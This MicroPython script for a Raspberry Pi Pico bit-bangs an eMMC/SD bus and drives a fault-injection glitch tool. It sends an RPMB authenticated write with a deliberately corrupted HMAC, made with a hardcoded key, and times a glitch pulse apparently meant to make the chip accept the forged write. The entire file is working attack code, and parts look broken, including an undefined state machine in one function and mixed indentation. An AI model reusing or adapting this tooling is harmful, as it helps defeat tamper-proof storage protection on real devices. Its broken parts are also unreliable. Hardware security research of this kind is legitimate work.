from machine import Pin
from machine import mem32
from rp2 import PIO, StateMachine, asm_pio
import time 
import hmac
import hashlib




@asm_pio(sideset_init=PIO.OUT_LOW, out_init=PIO.OUT_HIGH, out_shiftdir=PIO.SHIFT_LEFT, set_init=PIO.OUT_LOW, in_shiftdir=PIO.SHIFT_LEFT, autopull=False) 
def pio_cmd_tr():
    pull(block).side(0)
    mov(x, osr).side(0)
    pull(block).side(0)
    label("cmd1loop")
    pull(ifempty,block).side(0)
    out(pins, 1).side(0) [1]
    nop().side(1)
    jmp(x_dec, "cmd1loop")
    
@asm_pio(sideset_init=PIO.OUT_LOW, in_shiftdir=PIO.SHIFT_LEFT)
def pio_clocks():
    pull(block)
    #set(pindirs, 0)
    mov(x, osr)
    label("loop1")
    nop().side(0) [1]
    in_(pins, 1).side(1)
    jmp(x_dec, "loop1")
    push()
    nop().side(0)

@asm_pio(sideset_init=PIO.OUT_LOW, out_init=PIO.OUT_HIGH, out_shiftdir=PIO.SHIFT_LEFT, in_shiftdir=PIO.SHIFT_LEFT, autopull=False, set_init=PIO.OUT_LOW)
def pio_data_tx():
    pull(block).side(0)
    mov(x, osr)
    pull(block).side(0)
    label("ctxloop")
    pull(ifempty,block).side(0)
    out(pins, 1).side(1) [1]
    nop().side(0)
    jmp(x_dec, "ctxloop")
    set(pins, 1).side(1)[1]
    set(pins,0).side(0)

@asm_pio(sideset_init=PIO.OUT_LOW, autopull=False, fifo_join=PIO.JOIN_NONE)
def pio_high_counter():
    # Delay value
    pull(block).side(0)
    mov(y, osr)

    # High value
    pull(block)
    mov(x, osr)
    wait(1, gpio, 3)
    #wait(1, irq, 0) # wait for signal from sm2

    label("waitloop")
    jmp(y_dec, "waitloop")

    label("highloop")
    jmp(x_dec, "highloop").side(1)
    
    irq(clear, 0).side(0)


def cmd_send(cmd, arg):
    bitstream = (cmd|0x40)<<32 | arg
    bitstream = (bitstream << 8) | crc7(bitstream)   

    sm_cmds.put(47)
    sm_cmds.active(1)
    sm_cmds.put(bitstream >> 16)
    sm_cmds.put((bitstream & 0xffff)<<16)
    time.sleep(0.1)
    sm_cmds.active(0)
    sm_cmdr.put(31)
    sm_cmdr.active(1)
    resp=f'{sm_cmdr.get():032b}'
    sm_cmdr.put(31)
    resp+=f'{sm_cmdr.get():032b}'
    sm_cmdr.active(0)
    print(resp)
    return resp

def crc7(bitstream):
    crc = 0
    for i in reversed(range(5)):
        value = (bitstream & (0xFF<<8*i)) >> 8*i
        for j in range(8):
            crc <<= 1
            if (value & 0x80) != (crc & 0x80):
                crc ^= 0x09
            value <<= 1
    return ((crc&0x7f)<<1)|1


def crc16_one(crc, data):
    crc = ((crc >> 8)& 0xff | (crc << 8)) 
    crc ^= data
    crc ^= ((crc & 0xFF) >> 4)
    crc ^= (crc << 8) << 4
    crc ^= ((crc & 0xFF) << 4) <<1
    return crc & 0xffff

def crc16(data):
    crc = 0
    for i in range(len(data)):
        crc = crc16_one(crc, data[i])
    return crc & 0xffff

def data_send(counter):
    message = bytearray(b'\x41'*256 + b'\x00'*16 + b'\x00\x00\x00\x00' + b'\x00\x00\x00\x01\x00\x00\x00\x03')
    message[275] = counter
    key = b'\x9f\x10\xa8\x99\x74\xda\xe8\x3a\x19\xf0\xe7\x70\x80\x1b\x66\x28\x2e\xa4\x16\x53\x3d\x47\x87\x69\xf9\x2b\xd4\xbb\x1a\x6f\x9f\x05'
    sig = bytearray(hmac.new(key, msg=message, digestmod = hashlib.sha256).digest())
    ##changing the last bit of the hmac
    sig[31] ^= 0xff
    packet = bytearray([0]*196) + sig + message
    
    packet += int.to_bytes(crc16(packet), 2, 'big')
    sm_dats.put(4113)
    sm_dats.active(1)
        
    sm_dats.put(int.from_bytes(packet, 'big') >> 4081)
    for i in range(127):
    	sm_dats.put((int.from_bytes(packet, 'big') >> (4049-32*i))&0xFFFFFFFF)
    sm_dats.put((((int.from_bytes(packet,'big')&0x1FFFF)<<1)|1)<<14)
    time.sleep_ms(1)
    sm_dats.active(0)
        
        
def result_req_send():
    packet = bytearray([0]*512)
    packet[511] = 0x05 
    
    ###calculate crc
    packet += int.to_bytes(crc16(packet), 2, 'big')
    
    sm_dats.put(4113)
    sm_dats.active(1)
    sm_dats.put(int.from_bytes(packet, 'big') >> 4081)
    for i in range(127):
    	sm_dats.put((int.from_bytes(packet, 'big') >> 4049-32*i)&0xFFFFFFFF)
    sm_dats.put((((int.from_bytes(packet,'big')&0x1FFFF)<<1)|1)<<14)
    time.sleep(0.1)
    sm_dats.active(0)

sm_cmds = StateMachine(0, pio_cmd_tr, freq=2000000, sideset_base=Pin(18), out_base=Pin(17))
sm_cmdr = StateMachine(1, pio_clocks, freq=2000000, sideset_base=Pin(18), in_base=Pin(17))
sm_datr = StateMachine(2, pio_clocks, freq=2000000, sideset_base=Pin(18), in_base=Pin(19))
sm3 = StateMachine(4, pio_high_counter, freq=100000000, sideset_base=Pin(16))
sm_dats = StateMachine(3, pio_data_tx, freq = 2000000, sideset_base=Pin(18), out_base=Pin(19), set_base=Pin(3))

def init_sd():
    cmd_send(0, 0xf0f0f0f0)
    for i in range(5):
        res = cmd_send(1, 0x40ff8080)
        res = res[res.find('0'):res.find('0')+10]
        #print(res)
        if res[8] == '1':
            break

    cmd_send(2, 0)
    sm_datr.active(1)
    for i in range(5):
        sm_datr.put(31)
        sm_datr.get()
    sm_datr.active(0)

    res=cmd_send(3, 0x20000)
    if res.find('0') >= 0:
        print("Target ready!")
    

def rpmb_glitch(counter, glitch_delay, glitch_length):
    #cmd_send(0, 0xf0f0f0f0)
    #for i in range(5):
    #    res = cmd_send(1, 0x40ff8080)
    #    res = res[res.find('0'):res.find('0')+10]
    #    #print(res)
    #    if res[8] == '1':
    #        break

    #cmd_send(2, 0)
    #sm_datr.active(1)
    #for i in range(5):
    #    sm_datr.put(31)
    #    sm_datr.get()
    #sm_datr.active(0)

    #cmd_send(3, 0x20000)
    cmd_send(0x07, 0x20000)
    cmd_send(0x06, 0x3b30b01)
    cmd_send(13, 0x20000)
    cmd_send(23, 0x80000001)
    cmd_send(25, 0x0)
    cmd_send(13, 0x20000)
    sm3.put(glitch_delay)
    sm3.put(glitch_length)
    sm3.active(1)
        
    data_send(counter) #here at the last of the data send the trigger should go up
    
    sm_datr.active(1)
    sm_datr.put(31) 
    sm_datr.get()
    while(1):
    	sm_datr.put(31) 
    	resp = f'{sm_datr.get():032b}'
    	if resp.find('1') >= 0:
    		break   		
    sm_datr.active(0)
    sm3.active(0)
   
    cmd_send(13, 0x20000)
    cmd_send(23, 0x1)
    cmd_send(25, 0x0)
    
    result_req_send()
    
    #while(1):
    #	sm_datr.put(31) 
    #	resp = f'{sm_datr.get():032b}'
   # 	if resp.find('1') >= 0:
    #		break
    #sm_datr.active(0)
    
    cmd_send(13, 0x20000)
    cmd_send(23, 1)
    cmd_send(18, 0)
    
    resp=''

    for i in range(140):
        sm_datr.active(1)
    	sm_datr.put(31)
    	resp+=f'{sm_datr.get():032b}'
    sm_datr.active(0)
    
    print(hex(int(resp[resp.find('0')+1:resp.find('0')+4112+1],2)))
    
    
    cmd_send(6, 0x3b30001) 
       
def glitch_attempt(glitch_delay, glitch_length):
    sm3.active(1)
    sm3.put(glitch_delay)
    sm3.put(glitch_length)
    cmd_send(8, 0)
    #sm2.active(1)
    result = ''
    flag = 0

    for i in range(800): #get command response from cmd8 (one response by sm2.get is 32 bits long)
        sm2.active(1)
        resp=f'{sm2.get():032b}'
        if resp.find('0') < 0:
            continue
        elif flag == 0:
            result += resp[resp.find('0'):]
            flag = 1
            #print(resp)
        else:
            result+=resp
    #print(result)
    print('Iterations:', int(result[25:33],2) << 24 | int(result[17:25],2) << 16 | int(result[9:17],2) << 8  | int(result[1:9],2))
    
    print('Total Count:', int(result[57:65],2) << 24 | int(result[49:57],2) << 16 | int(result[41:49],2) << 8 | int(result[33:41],2))
    sm3.active(0)
    sm2.active(0)

def pwr_reset(timeout:int=1):
    sm_cmds.active(1)
    sm_cmds.exec("set(pins, 0).side(0)")
    sm_cmds.active(0)
    sm_cmdr.active(0)
    sm_datr.active(0)
    sm_dats.active(1)
    sm_dats.exec("set(pins, 0).side(0)")
    sm_dats.active(0)
    sm3.active(0)
    Pin(15, Pin.OUT).value(1)
    time.sleep(timeout)
    Pin(15, Pin.OUT).value(0)

